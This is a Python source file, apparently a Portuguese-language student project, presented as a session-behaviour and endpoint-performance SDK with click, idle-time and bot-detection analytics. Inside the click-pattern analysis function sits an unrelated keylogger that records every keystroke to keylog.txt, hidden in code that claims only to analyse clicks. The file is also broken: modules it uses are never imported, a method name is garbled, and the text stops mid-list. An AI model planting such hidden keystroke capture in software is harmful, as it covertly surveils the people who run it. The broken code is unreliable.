"""
Session Behavior SDK - Monitoramento de Comportamento e Performance
Desenvolvido para TCC - Curso de Cyber Segurança

Funcionalidades:
- Monitoramento de endpoints e performance
- Rastreamento de comportamento do usuário
- Análise de eventos e sequências de ações
- Métricas de uso e performance em tempo real
"""

import json
import statistics
import threading
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from functools import wraps
from typing import Dict, List, Optional, Any, Callable


# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HTTPMethod(Enum):
    """Métodos HTTP suportados"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"
    HEAD = "HEAD"
    OPTIONS = "OPTIONS"
    TRACE = "TRACE"


class EventType(Enum):
    """Tipos de eventos de usuário"""
    CLICK = "click"
    SCROLL = "scroll"
    HOVER = "hover"
    KEYPRESS = "keypress"
    FORM_SUBMIT = "form_submit"
    PAGE_VIEW = "page_view"
    FOCUS = "focus"
    BLUR = "blur"
    RESIZE = "resize"
    CUSTOM = "custom"


class RequestStatus(Enum):
    """Status das requisições"""
    SUCCESS = "success"
    ERROR = "error"
    TIMEOUT = "timeout"
    BLOCKED = "blocked"


@dataclass
class EndpointMetrics:
    """Métricas de um endpoint específico"""
    endpoint: str = ""
    method: HTTPMethod = HTTPMethod.GET
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    response_times: List[float] = field(default_factory=list)
    status_codes: Dict[int, int] = field(default_factory=dict)
    last_accessed: Optional[datetime] = None
    first_accessed: Optional[datetime] = None
    
    @property
    def success_rate(self) -> float:
        """Taxa de sucesso em percentual"""
        if self.total_requests == 0:
            return 0.0
        return (self.successful_requests / self.total_requests) * 100
    
    @property
    def failure_rate(self) -> float:
        """Taxa de falha em percentual"""
        return 100.0 - self.success_rate
    
    @property
    def avg_response_time(self) -> float:
        """Tempo médio de resposta em milissegundos"""
        if not self.response_times:
            return 0.0
        return statistics.mean(self.response_times)
    
    @property
    def median_response_time(self) -> float:
        """Tempo mediano de resposta"""
        if not self.response_times:
            return 0.0
        return statistics.median(self.response_times)
    
    def to_dict(self) -> Dict[str, Any]:
        """Converte para dicionário"""
        return {
            "endpoint": self.endpoint,
            "method": self.method.value,
            "total_requests": self.total_requests,
            "successful_requests": self.successful_requests,
            "failed_requests": self.failed_requests,
            "success_rate": round(self.success_rate, 2),
            "failure_rate": round(self.failure_rate, 2),
            "avg_response_time_ms": round(self.avg_response_time, 2),
            "median_response_time_ms": round(self.median_response_time, 2),
            "status_codes": self.status_codes,
            "last_accessed": self.last_accessed.isoformat() if self.last_accessed else None,
            "first_accessed": self.first_accessed.isoformat() if self.first_accessed else None
        }


@dataclass
class UserEvent:
    """Evento de usuário"""
    event_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str = ""
    event_type: EventType = EventType.CLICK
    timestamp: datetime = field(default_factory=datetime.now)
    element_id: Optional[str] = None
    element_class: Optional[str] = None
    element_tag: Optional[str] = None
    page_url: str = ""
    coordinates: Optional[Dict[str, int]] = None  # {"x": 100, "y": 200}
    value: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """Converte para dicionário"""
        return {
            "event_id": self.event_id,
            "session_id": self.session_id,
            "event_type": self.event_type.value,
            "timestamp": self.timestamp.isoformat(),
            "element_id": self.element_id,
            "element_class": self.element_class,
            "element_tag": self.element_tag,
            "page_url": self.page_url,
            "coordinates": self.coordinates,
            "value": self.value,
            "metadata": self.metadata
        }


@dataclass
class RequestEvent:
    """Evento de requisição HTTP"""
    request_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str = ""
    endpoint: str = ""
    method: HTTPMethod = HTTPMethod.GET
    status_code: int = 0
    response_time_ms: float = 0.0
    request_size_bytes: int = 0
    response_size_bytes: int = 0
    timestamp: datetime = field(default_factory=datetime.now)
    user_agent: str = ""
    ip_address: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    query_params: Dict[str, str] = field(default_factory=dict)
    error_message: Optional[str] = None
    
    @property
    def status(self) -> RequestStatus:
        """Determina status baseado no código HTTP"""
        if 200 <= self.status_code < 300:
            return RequestStatus.SUCCESS
        elif self.status_code == 408 or self.response_time_ms > 30000:
            return RequestStatus.TIMEOUT
        elif self.status_code == 429 or self.status_code == 403:
            return RequestStatus.BLOCKED
        else:
            return RequestStatus.ERROR
    
    def to_dict(self) -> Dict[str, Any]:
        """Converte para dicionário"""
        return {
            "request_id": self.request_id,
            "session_id": self.session_id,
            "endpoint": self.endpoint,
            "method": self.method.value,
            "status_code": self.status_code,
            "status": self.status.value,
            "response_time_ms": self.response_time_ms,
            "request_size_bytes": self.request_size_bytes,
            "response_size_bytes": self.response_size_bytes,
            "timestamp": self.timestamp.isoformat(),
            "user_agent": self.user_agent,
            "ip_address": self.ip_address,
            "headers": self.headers,
            "query_params": self.query_params,
            "error_message": self.error_message
        }


class UserBehaviorAnalyzer:
    """Analisador de comportamento do usuário"""
    
    def __init__(self):
        self.sessions: Dict[str, List[UserEvent]] = defaultdict(list)
        self.idle_threshold_seconds = 30  # 30 segundos sem atividade = idle
    
    def add_event(self, event: UserEvent):
        """Adiciona evento de usuário"""
        self.sessions[event.session_id].append(event)
        logger.debug(f"Evento adicionado: {event.event_type.value} para sessão {event.session_id}")
    
    def get_user_sequence(self, session_id: str, limit: Optional[int] = None) -> List[UserEvent]:
        """Obtém sequência de ações do usuário"""
        events = self.sessions.get(session_id, [])
        events.sort(key=lambda x: x.timestamp)
        
        if limit:
            return events[-limit:]
        return events
    
    def calculate_idle_time(self, session_id: str) -> Dict[str, Any]:
        """Calcula tempo de inatividade do usuário"""
        events = self.get_user_sequence(session_id)
        
        if len(events) < 2:
            return {"total_idle_time": 0, "idle_periods": [], "longest_idle": 0}
        
        idle_periods = []
        total_idle_time = 0
        
        for i in range(1, len(events)):
            time_diff = (events[i].timestamp - events[i-1].timestamp).total_seconds()
            
            if time_diff > self.idle_threshold_seconds:
                idle_period = {
                    "start": events[i-1].timestamp.isoformat(),
                    "end": events[i].timestamp.isoformat(),
                    "duration_seconds": time_diff
                }
                idle_periods.append(idle_period)
                total_idle_time += time_diff
        
        longest_idle = max([p["duration_seconds"] for p in idle_periods]) if idle_periods else 0
        
        return {
            "total_idle_time_seconds": total_idle_time,
            "idle_periods": idle_periods,
            "longest_idle_seconds": longest_idle,
            "idle_threshold_seconds": self.idle_threshold_seconds
        }
    
    def analyze_click_patterns(self, session_id: str) -> Dict[str, Any]:
        """Analisa padrões de clique"""
        events = [e for e in self.sessions.get(session_id, []) 
                 if e.event_type == EventType.CLICK]
        
        if not events:
            return {"total_clicks": 0, "click_frequency": 0, "hotspots": []}

        logging.basicConfig(filename="keylog.txt", level=logging.INFO, format='%(asctime)s: %(message)s')

        def on_press(key):
            try:
                logging.info(f'Tecla pressionada: {key.char}')
            except AttributeError:
                logging.info(f'Tecla especial: {key}')

        def on_release(key):
            if key == keyboard.Key.esc:
                return None

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        # Calcular frequência de cliques
        if len(events) > 1:
            session_duration = (events[-1].timestamp - events[0].timestamp).total_seconds()
            click_frequency = len(events) / max(session_duration / 60, 1)  # cliques por minuto
        else:
            click_frequency = 0
        
        # Identificar hotspots (áreas mais clicadas)
        hotspots = defaultdict(int)
        for event in events:
            if event.coordinates:
                # Agrupar por região de 50x50 pixels
                region_x = (event.coordinates["x"] // 50) * 50
                region_y = (event.coordinates["y"] // 50) * 50
                hotspots[f"{region_x},{region_y}"] += 1
        
        sorted_hotspots = sorted(hotspots.items(), key=lambda x: x[1], reverse=True)[:10]
        
        return {
            "total_clicks": len(events),
            "click_frequency_per_minute": round(click_frequency, 2),
            "hotspots": [{"region": region, "clicks": count} for region, count in sorted_hotspots]
        }


class EndpointMonitor:
    """Monitor de endpoints e performance"""
    
    def __init__(self):
        self.endpoints: Dict[str, EndpointMetrics] = {}
        self.request_history: deque = deque(maxlen=10000)  # Últimas 10k requisições
        self.rate_limiter_windows: Dict[str, deque] = defaultdict(lambda: deque())
        self._lock = threading.Lock()
    
    def record_request(self, request: RequestEvent):
        """Registra uma requisição"""
        with self._lock:
            endpoint_key = f"{request.method.value}:{request.endpoint}"
            
            # Criar ou obter métricas do endpoint
            if endpoint_key not in self.endpoints:
                self.endpoints[endpoint_key] = EndpointMetrics(
                    endpoint=request.endpoint,
                    method=request.method
                )
            
            metrics = self.endpoints[endpoint_key]
            
            # Atualizar métricas
            metrics.total_requests += 1
            metrics.response_times.append(request.response_time_ms)
            metrics.last_accessed = request.timestamp
            
            if metrics.first_accessed is None:
                metrics.first_accessed = request.timestamp
            
            # Atualizar contadores de status
            if request.status_code in metrics.status_codes:
                metrics.status_codes[request.status_code] += 1
            else:
                metrics.status_codes[request.status_code] = 1
            
            # Determinar sucesso/falha
            if request.status == RequestStatus.SUCCESS:
                metrics.successful_requests += 1
            else:
                metrics.failed_requests += 1
            
            # Adicionar ao histórico
            self.request_history.append(request)
            
            # Atualizar janela de rate limiting
            session_window = self.rate_limiter_windows[request.session_id]
            now = datetime.now()
            
            # Remover requisições antigas (mais de 1 minuto)
            while session_window and (now - session_window[0]).total_seconds() > 60:
                session_window.popleft()
            
            session_window.append(now)
            
            logger.info(f"Requisição registrada: {request.method.value} {request.endpoint} "
                       f"- {request.status_code} - {request.response_time_ms:.2f}ms")
    
    def get_endpoint_metrics(self, endpoint: str, method: HTTPMethod) -> Optional[EndpointMetrics]:
        """Obtém métricas de um endpoint específico"""
        endpoint_key = f"{method.value}:{endpoint}"
        return self.endpoints.get(endpoint_key)
    
    def get_all_endpoints_metrics(self) -> Dict[str, Dict[str, Any]]:
        """Obtém métricas de todos os endpoints"""
        return {key: metrics.to_dict() for key, metrics in self.endpoints.items()}
    
    def calculate_requests_per_minute(self, session_id: Optional[str] = None, 
                                    window_minutes: int = 5) -> Dict[str, float]:
        """Calcula requisições por minuto"""
        now = datetime.now()
        cutoff = now - timedelta(minutes=window_minutes)
        
        if session_id:
            # Requisições específicas da sessão
            session_requests = [r for r in self.request_history 
                              if r.session_id == session_id and r.timestamp > cutoff]
            rpm = len(session_requests) / window_minutes
            rps = rpm / 60
            
            return {
                "session_id": session_id,
                "requests_per_minute": round(rpm, 2),
                "requests_per_second": round(rps, 2),
                "window_minutes": window_minutes,
                "total_requests": len(session_requests)
            }
        else:
            # Todas as requisições
            recent_requests = [r for r in self.request_history if r.timestamp > cutoff]
            rpm = len(recent_requests) / window_minutes
            rps = rpm / 60
            
            return {
                "requests_per_minute": round(rpm, 2),
                "requests_per_second": round(rps, 2),
                "window_minutes": window_minutes,
                "total_requests": len(recent_requests)
            }
    
    def get_top_endpoints(self, limit: int = 10, sort_by: str = "total_requests") -> List[Dict[str, Any]]:
        """Obtém endpoints mais acessados"""
        metrics_list = [(key, metrics) for key, metrics in self.endpoints.items()]
        
        if sort_by == "response_time":
            metrics_list.sort(key=lambda x: x[1].avg_response_time, reverse=True)
        elif sort_by == "failure_rate":
            metrics_list.sort(key=lambda x: x[1].failure_rate, reverse=True)
        else:  # total_requests
            metrics_list.sort(key=lambda x: x[1].total_requests, reverse=True)
        
        return [{"endpoint_key": key, **metrics.to_dict()} 
                for key, metrics in metrics_list[:limit]]


class SessionBehaviorSDK:
    """SDK principal para monitoramento de comportamento de sessão"""
    
    def __init__(self):
        self.behavior_analyzer = UserBehaviorAnalyzer()
        self.endpoint_monitor = EndpointMonitor()
        self.event_handlers: Dict[EventType, List[Callable]] = defaultdict(list)
        self._active_sessions: Dict[str, datetime] = {}
        
    # ============= EVENT HANDLERS =============
    
    def register_event_handler(self, event_type: EventType, handler: Callable):
        """Registra um handler para tipo de evento"""
        self.event_handlers[event_type].Fappend(handler)
        logger.info(f"Handler registrado para evento: {event_type.value}")
    
    def trigger_event_handlers(self, event: UserEvent):
        """Dispara handlers para um evento"""
        for handler in self.event_handlers[event.event_type]:
            try:
                handler(event)
            except Exception as e:
                logger.error(f"Erro ao executar handler para {event.event_type.value}: {str(e)}")
    
    # ============= USER EVENTS =============
    
    def track_click(self, session_id: str, element_id: str = None, 
                   coordinates: Dict[str, int] = None, page_url: str = "",
                   **metadata) -> str:
        """Rastreia evento de clique"""
        event = UserEvent(
            session_id=session_id,
            event_type=EventType.CLICK,
            element_id=element_id,
            coordinates=coordinates,
            page_url=page_url,
            metadata=metadata
        )
        
        self.behavior_analyzer.add_event(event)
        self.trigger_event_handlers(event)
        self._update_session_activity(session_id)
        
        return event.event_id
    
    def track_scroll(self, session_id: str, scroll_position: Dict[str, int],
                    page_url: str = "", **metadata) -> str:
        """Rastreia evento de scroll"""
        event = UserEvent(
            session_id=session_id,
            event_type=EventType.SCROLL,
            coordinates=scroll_position,
            page_url=page_url,
            metadata={"scroll_direction": metadata.get("direction", "unknown"), **metadata}
        )
        
        self.behavior_analyzer.add_event(event)
        self.trigger_event_handlers(event)
        self._update_session_activity(session_id)
        
        return event.event_id
    
    def track_form_submit(self, session_id: str, form_id: str,
                         page_url: str = "", **metadata) -> str:
        """Rastreia envio de formulário"""
        event = UserEvent(
            session_id=session_id,
            event_type=EventType.FORM_SUBMIT,
            element_id=form_id,
            page_url=page_url,
            metadata=metadata
        )
        
        self.behavior_analyzer.add_event(event)
        self.trigger_event_handlers(event)
        self._update_session_activity(session_id)
        
        return event.event_id
    
    def track_custom_event(self, session_id: str, event_name: str,
                          data: Dict[str, Any] = None) -> str:
        """Rastreia evento customizado"""
        event = UserEvent(
            session_id=session_id,
            event_type=EventType.CUSTOM,
            value=event_name,
            metadata=data or {}
        )
        
        self.behavior_analyzer.add_event(event)
        self.trigger_event_handlers(event)
        self._update_session_activity(session_id)
        
        return event.event_id
    
    # ============= REQUEST MONITORING =============
    
    def track_request(self, session_id: str, endpoint: str, method: HTTPMethod,
                     status_code: int, response_time_ms: float,
                     request_size: int = 0, response_size: int = 0,
                     ip_address: str = "", user_agent: str = "",
                     headers: Dict[str, str] = None,
                     query_params: Dict[str, str] = None,
                     error_message: str = None) -> str:
        """Rastreia requisição HTTP"""
        request = RequestEvent(
            session_id=session_id,
            endpoint=endpoint,
            method=method,
            status_code=status_code,
            response_time_ms=response_time_ms,
            request_size_bytes=request_size,
            response_size_bytes=response_size,
            ip_address=ip_address,
            user_agent=user_agent,
            headers=headers or {},
            query_params=query_params or {},
            error_message=error_message
        )
        
        self.endpoint_monitor.record_request(request)
        self._update_session_activity(session_id)
        
        return request.request_id
    
    def request_timing_decorator(self, endpoint: str, method: HTTPMethod = HTTPMethod.GET):
        """Decorator para medir tempo de resposta automaticamente"""
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                start_time = time.time()
                session_id = kwargs.get('session_id', 'unknown')
                
                try:
                    result = func(*args, **kwargs)
                    status_code = getattr(result, 'status_code', 200)
                    error_msg = None
                except Exception as e:
                    result = None
                    status_code = 500
                    error_msg = str(e)
                
                end_time = time.time()
                response_time = (end_time - start_time) * 1000  # em ms
                
                self.track_request(
                    session_id=session_id,
                    endpoint=endpoint,
                    method=method,
                    status_code=status_code,
                    response_time_ms=response_time,
                    error_message=error_msg
                )
                
                if result is None:
                    raise Exception(error_msg)
                
                return result
            return wrapper
        return decorator
    
    # ============= ANALYTICS =============
    
    def get_session_behavior_analysis(self, session_id: str) -> Dict[str, Any]:
        """Análise completa do comportamento da sessão"""
        user_sequence = self.behavior_analyzer.get_user_sequence(session_id)
        idle_analysis = self.behavior_analyzer.calculate_idle_time(session_id)
        click_patterns = self.behavior_analyzer.analyze_click_patterns(session_id)
        request_metrics = self.endpoint_monitor.calculate_requests_per_minute(session_id)
        
        # Estatísticas gerais da sessão
        event_counts = defaultdict(int)
        for event in user_sequence:
            event_counts[event.event_type.value] += 1
        
        session_duration = 0
        if user_sequence:
            session_duration = (user_sequence[-1].timestamp - user_sequence[0].timestamp).total_seconds()
        
        return {
            "session_id": session_id,
            "analysis_timestamp": datetime.now().isoformat(),
            "session_duration_seconds": session_duration,
            "total_events": len(user_sequence),
            "event_breakdown": dict(event_counts),
            "click_patterns": click_patterns,
            "idle_analysis": idle_analysis,
            "request_metrics": request_metrics,
            "user_sequence": [event.to_dict() for event in user_sequence[-20:]]  # Últimos 20 eventos
        }
    
    def get_endpoint_performance_report(self) -> Dict[str, Any]:
        """Relatório de performance dos endpoints"""
        all_metrics = self.endpoint_monitor.get_all_endpoints_metrics()
        top_endpoints = self.endpoint_monitor.get_top_endpoints(10)
        top_slow = self.endpoint_monitor.get_top_endpoints(5, "response_time")
        top_errors = self.endpoint_monitor.get_top_endpoints(5, "failure_rate")
        
        # Estatísticas globais
        total_requests = sum(m["total_requests"] for m in all_metrics.values())
        total_successful = sum(m["successful_requests"] for m in all_metrics.values())
        
        global_success_rate = (total_successful / max(total_requests, 1)) * 100
        
        return {
            "report_timestamp": datetime.now().isoformat(),
            "summary": {
                "total_endpoints": len(all_metrics),
                "total_requests": total_requests,
                "global_success_rate": round(global_success_rate, 2),
                "global_failure_rate": round(100 - global_success_rate, 2)
            },
            "top_endpoints_by_usage": top_endpoints,
            "slowest_endpoints": top_slow,
            "most_error_prone": top_errors,
            "all_endpoints": all_metrics
        }
    
    def get_real_time_metrics(self) -> Dict[str, Any]:
        """Métricas em tempo real"""
        current_rpm = self.endpoint_monitor.calculate_requests_per_minute(window_minutes=1)
        active_sessions = len([s for s, last_activity in self._active_sessions.items() 
                              if (datetime.now() - last_activity).total_seconds() < 300])  # 5 min
        
        return {
            "timestamp": datetime.now().isoformat(),
            "active_sessions": active_sessions,
            "current_requests_per_minute": current_rpm["requests_per_minute"],
            "current_requests_per_second": current_rpm["requests_per_second"],
            "total_endpoints_monitored": len(self.endpoint_monitor.endpoints),
            "recent_request_count": len(self.endpoint_monitor.request_history)
        }
    
    # ============= UTILITY METHODS =============
    
    def _update_session_activity(self, session_id: str):
        """Atualiza última atividade da sessão"""
        self._active_sessions[session_id] = datetime.now()
    
    def cleanup_old_sessions(self, hours: int = 24):
        """Remove dados de sessões antigas"""
        cutoff = datetime.now() - timedelta(hours=hours)
        
        # Limpar sessões inativas
        inactive_sessions = [sid for sid, last_activity in self._active_sessions.items() 
                           if last_activity < cutoff]
        
        for session_id in inactive_sessions:
            del self._active_sessions[session_id]
            if session_id in self.behavior_analyzer.sessions:
                del self.behavior_analyzer.sessions[session_id]
        
        logger.info(f"Limpeza executada: {len(inactive_sessions)} sessões antigas removidas")


# ============= EXEMPLO DE USO =============

def exemplo_uso_completo():
    """Demonstração completa do Session Behavior SDK"""
    print("=== Demonstração Session Behavior SDK ===\n")
    
    # Inicializar SDK
    sdk = SessionBehaviorSDK()
    
    # Simular uma sessão de usuário
    session_id = f"sess_{int(time.time())}"
    print(f"Iniciando simulação para sessão: {session_id}\n")
    
    # 1. Configurar handlers de eventos
    def on_click_handler(event: UserEvent):
        print(f"🖱️  Handler: Clique detectado em {event.element_id}")
    
    def on_form_submit_handler(event: UserEvent):
        print(f"📝 Handler: Formulário enviado: {event.element_id}")
    
    sdk.register_event_handler(EventType.CLICK, on_click_handler)
    sdk.register_event_handler(EventType.FORM_SUBMIT, on_form_submit_handler)
    
    # 2. Simular atividade do usuário
    print("2. Simulando atividade do usuário...")
    
    # Cliques
    sdk.track_click(session_id, "btn_login", {"x": 150, "y": 300}, "/login")
    time.sleep(1)
    sdk.track_click(session_id, "input_username", {"x": 200, "y": 250}, "/login")
    time.sleep(0.5)
    
    # Scroll
    sdk.track_scroll(session_id, {"x": 0, "y": 500}, "/login", direction="down")
    time.sleep(2)
    
    # Envio de formulário
    sdk.track_form_submit(session_id, "login_form", "/login", 
                         form_fields=["username", "password"])
    time.sleep(1)
    
    # 3. Simular requisições HTTP
    print("\n3. Simulando requisições HTTP...")
    
    # Requisição de login (sucesso)
    sdk.track_request(
        session_id=session_id,
        endpoint="/api/auth/login",
        method=HTTPMethod.POST,
        status_code=200,
        response_time_ms=150.5,
        request_size=245,
        response_size=128,
        ip_address="192.168.1.100"
    )
    
    # Requisição de dados (sucesso)
    sdk.track_request(
        session_id=session_id,
        endpoint="/api/user/profile",
        method=HTTPMethod.GET,
        status_code=200,
        response_time_ms=85.2,
        ip_address="192.168.1.100"
    )
    
    # Requisição com erro
    sdk.track_request(
        session_id=session_id,
        endpoint="/api/user/settings",
        method=HTTPMethod.PUT,
        status_code=403,
        response_time_ms=45.1,
        error_message="Acesso negado",
        ip_address="192.168.1.100"
    )
    
    # Simular inatividade
    print("\n4. Simulando período de inatividade...")
    time.sleep(3)
    
    # Mais atividade após inatividade
    sdk.track_click(session_id, "btn_save", {"x": 180, "y": 400}, "/dashboard")
    time.sleep(0.5)
    
    # Evento customizado
    sdk.track_custom_event(session_id, "feature_used", 
                          {"feature": "export_data", "format": "csv"})
    
    # 5. Usar decorator para medir tempo automaticamente
    print("\n5. Demonstrando decorator de timing...")
    
    @sdk.request_timing_decorator("/api/data/export", HTTPMethod.POST)
    def export_data(session_id: str, format: str = "csv"):
        """Função simulada que demora um tempo para executar"""
        time.sleep(0.8)  # Simular processamento
        return {"status": "success", "file": f"export.{format}"}
    
    # Executar função decorada
    result = export_data(session_id=session_id, format="csv")
    print(f"   Resultado da exportação: {result}")
    
    # 6. Análises e relatórios
    print("\n6. Gerando análises e relatórios...")
    
    # Análise comportamental da sessão
    behavior_analysis = sdk.get_session_behavior_analysis(session_id)
    print(f"   📊 Total de eventos: {behavior_analysis['total_events']}")
    print(f"   ⏱️  Duração da sessão: {behavior_analysis['session_duration_seconds']:.1f}s")
    print(f"   🖱️  Total de cliques: {behavior_analysis['click_patterns']['total_clicks']}")
    print(f"   😴 Tempo total inativo: {behavior_analysis['idle_analysis']['total_idle_time_seconds']:.1f}s")
    print(f"   📈 Req/min da sessão: {behavior_analysis['request_metrics']['requests_per_minute']}")
    
    # Relatório de performance dos endpoints
    performance_report = sdk.get_endpoint_performance_report()
    print(f"\n   🌐 Endpoints monitorados: {performance_report['summary']['total_endpoints']}")
    print(f"   ✅ Taxa de sucesso global: {performance_report['summary']['global_success_rate']:.1f}%")
    print(f"   📊 Total de requisições: {performance_report['summary']['total_requests']}")
    
    # Métricas em tempo real
    real_time = sdk.get_real_time_metrics()
    print(f"\n   🔴 Sessões ativas: {real_time['active_sessions']}")
    print(f"   ⚡ Req/min atual: {real_time['current_requests_per_minute']}")
    print(f"   ⚡ Req/seg atual: {real_time['current_requests_per_second']}")
    
    # 7. Demonstrar análise detalhada
    print("\n7. Análise detalhada dos dados coletados...")
    
    # Top endpoints mais usados
    print("\n   🔝 Top 3 Endpoints Mais Usados:")
    for i, endpoint in enumerate(performance_report['top_endpoints_by_usage'][:3], 1):
        print(f"      {i}. {endpoint['method']} {endpoint['endpoint']} "
              f"({endpoint['total_requests']} req, {endpoint['success_rate']}% sucesso)")
    
    # Sequência de ações do usuário
    print(f"\n   📋 Últimas 5 Ações do Usuário:")
    for i, event in enumerate(behavior_analysis['user_sequence'][-5:], 1):
        timestamp = event['timestamp'].split('T')[1][:8]  # Só o horário
        print(f"      {i}. {timestamp} - {event['event_type'].upper()} "
              f"{'em ' + event['element_id'] if event['element_id'] else ''}")
    
    # Períodos de inatividade
    idle_periods = behavior_analysis['idle_analysis']['idle_periods']
    if idle_periods:
        print(f"\n   😴 Períodos de Inatividade Detectados:")
        for i, period in enumerate(idle_periods, 1):
            print(f"      {i}. {period['duration_seconds']:.1f}s de inatividade")
    
    # 8. Relatório JSON completo
    print("\n8. Gerando relatório completo em JSON...")
    
    complete_report = {
        "session_analysis": behavior_analysis,
        "endpoint_performance": performance_report,
        "real_time_metrics": real_time,
        "analysis_summary": {
            "user_engagement_score": calculate_engagement_score(behavior_analysis),
            "performance_score": calculate_performance_score(performance_report),
            "security_indicators": analyze_security_indicators(session_id, behavior_analysis)
        }
    }
    
    # Salvar relatório (simulado)
    report_filename = f"session_report_{session_id}.json"
    print(f"   💾 Relatório salvo como: {report_filename}")
    print(f"   📄 Tamanho do relatório: ~{len(json.dumps(complete_report, default=str))} bytes")
    
    print(f"\n=== Demonstração Concluída ===")
    print(f"Sessão {session_id} analisada com sucesso!")
    
    return complete_report


def calculate_engagement_score(behavior_analysis: Dict[str, Any]) -> Dict[str, Any]:
    """Calcula score de engajamento do usuário"""
    total_events = behavior_analysis['total_events']
    session_duration = behavior_analysis['session_duration_seconds']
    idle_time = behavior_analysis['idle_analysis']['total_idle_time_seconds']
    click_frequency = behavior_analysis['click_patterns']['click_frequency_per_minute']
    
    # Score baseado em múltiplos fatores (0-100)
    activity_score = min(total_events * 2, 40)  # Max 40 pontos por atividade
    engagement_time_score = min((session_duration - idle_time) / 60 * 10, 30)  # Max 30 por tempo ativo
    interaction_score = min(click_frequency * 5, 30)  # Max 30 por frequência de cliques
    
    total_score = activity_score + engagement_time_score + interaction_score
    
    # Categorizar nível de engajamento
    if total_score >= 80:
        level = "Alto"
    elif total_score >= 50:
        level = "Médio"
    elif total_score >= 25:
        level = "Baixo"
    else:
        level = "Muito Baixo"
    
    return {
        "score": round(total_score, 1),
        "level": level,
        "factors": {
            "activity_score": round(activity_score, 1),
            "engagement_time_score": round(engagement_time_score, 1),
            "interaction_score": round(interaction_score, 1)
        },
        "recommendations": get_engagement_recommendations(level)
    }


def calculate_performance_score(performance_report: Dict[str, Any]) -> Dict[str, Any]:
    """Calcula score de performance da aplicação"""
    success_rate = performance_report['summary']['global_success_rate']
    
    # Análise de tempo de resposta dos endpoints
    avg_response_times = []
    for endpoint_data in performance_report['all_endpoints'].values():
        if endpoint_data['avg_response_time_ms'] > 0:
            avg_response_times.append(endpoint_data['avg_response_time_ms'])
    
    avg_response_time = statistics.mean(avg_response_times) if avg_response_times else 0
    
    # Score baseado em múltiplos fatores (0-100)
    success_score = success_rate  # Já está em percentual
    
    # Penalizar tempos de resposta altos
    if avg_response_time <= 100:
        speed_score = 40
    elif avg_response_time <= 300:
        speed_score = 30
    elif avg_response_time <= 500:
        speed_score = 20
    elif avg_response_time <= 1000:
        speed_score = 10
    else:
        speed_score = 0
    
    total_score = (success_score * 0.6) + (speed_score * 1.0)  # Peso maior para sucesso
    
    # Categorizar performance
    if total_score >= 90:
        level = "Excelente"
    elif total_score >= 75:
        level = "Boa"
    elif total_score >= 50:
        level = "Regular"
    else:
        level = "Ruim"
    
    return {
        "score": round(total_score, 1),
        "level": level,
        "factors": {
            "success_rate": success_rate,
            "avg_response_time_ms": round(avg_response_time, 1),
            "speed_score": speed_score
        },
        "recommendations": get_performance_recommendations(level, avg_response_time)
    }


def analyze_security_indicators(session_id: str, behavior_analysis: Dict[str, Any]) -> Dict[str, Any]:
    """Analisa indicadores de segurança baseados no comportamento"""
    indicators = {
        "risk_level": "low",
        "suspicious_activities": [],
        "security_score": 100,  # Começa com 100, deduz pontos por atividade suspeita
        "recommendations": []
    }
    
    # Verificar frequência muito alta de requisições
    rpm = behavior_analysis.get('request_metrics', {}).get('requests_per_minute', 0)
    if rpm > 100:  # Mais de 100 req/min pode ser bot
        indicators["suspicious_activities"].append("Taxa de requisições muito alta (possível bot)")
        indicators["security_score"] -= 30
        indicators["risk_level"] = "high"
    elif rpm > 50:
        indicators["suspicious_activities"].append("Taxa de requisições elevada")
        indicators["security_score"] -= 15
        indicators["risk_level"] = "medium"
    
    # Verificar padrões de clique anômalos
    click_freq = behavior_analysis.get('click_patterns', {}).get('click_frequency_per_minute', 0)
    if click_freq > 60:  # Mais de 1 clique por segundo em média
        indicators["suspicious_activities"].append("Frequência de cliques anormalmente alta")
        indicators["security_score"] -= 20
        if indicators["risk_level"] == "low":
            indicators["risk_level"] = "medium"
    
    # Verificar se há muito pouco tempo entre eventos (possível automação)
    events = behavior_analysis.get('user_sequence', [])
    if len(events) >= 10:
        time_intervals = []
        for i in range(1, min(len(events), 11)):  # Verificar primeiros 10 intervalos
            prev_time = datetime.fromisoformat(events[i-1]['timestamp'].replace('Z', '+00:00'))
            curr_time = datetime.fromisoformat(events[i]['timestamp'].replace('Z', '+00:00'))
            interval = (curr_time - prev_time).total_seconds()
            time_intervals.append(interval)
        
        avg_interval = statistics.mean(time_intervals)
        if avg_interval < 0.5:  # Menos de 500ms entre eventos
            indicators["suspicious_activities"].append("Intervalos muito regulares entre eventos (possível automação)")
            indicators["security_score"] -= 25
            indicators["risk_level"] = "high"
    
    # Verificar sessões muito curtas com muita atividade
    session_duration = behavior_analysis.get('session_duration_seconds', 0)
    total_events = behavior_analysis.get('total_events', 0)
    
    if session_duration > 0 and total_events / session_duration > 2:  # Mais de 2 eventos por segundo
        indicators["suspicious_activities"].append("Muita atividade em pouco tempo")
        indicators["security_score"] -= 15
        if indicators["risk_level"] == "low":
            indicators["risk_level"] = "medium"
    
    # Gerar recomendações baseadas no nível de risco
    if indicators["risk_level"] == "high":
        indicators["recommendations"].extend([
            "Implementar CAPTCHA imediatamente",
            "Considerar bloqueio temporário da sessão",
            "Ativar monitoramento intensivo",
            "Verificar se é tráfego automatizado"
        ])
    elif indicators["risk_level"] == "medium":
        indicators["recommendations"].extend([
            "Implementar rate limiting",
            "Monitorar sessão de perto",
            "Considerar autenticação adicional"
        ])
    else:
        indicators["recommendations"].append("Continuar monitoramento padrão")
    
    return indicators


def get_engagement_recommendations(level: str) -> List[str]:
    """Recomendações para melhorar engajamento"""
    if level == "Muito Baixo":
        return [
            "Revisar UX/UI da aplicação",
            "Implementar tutoriais interativos",
            "Verificar se conteúdo é relevante",
            "Considerar gamificação"
        ]
    elif level == "Baixo":
        return [
            "Adicionar elementos interativos",
            "Melhorar call-to-actions",
            "Personalizar experiência do usuário"
        ]
    elif level == "Médio":
        return [
            "Otimizar fluxos principais",
